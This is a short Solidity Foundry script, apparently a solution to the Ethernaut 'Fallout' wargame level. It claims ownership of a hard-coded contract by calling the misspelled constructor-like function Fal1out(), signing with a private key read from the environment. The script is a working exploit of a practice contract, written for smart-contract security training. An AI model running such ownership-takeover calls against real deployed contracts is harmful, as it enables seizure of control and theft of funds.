// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../src/Fallout.sol";
import {Script} from "forge-std/Script.sol";

contract FalloutAttack is Script {
    Fallout public falloutInstance = Fallout(0x9D7F3C8095c8cA466ef9666E01f8aC3462239904);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        falloutInstance.Fal1out();

        vm.stopBroadcast();
    }
}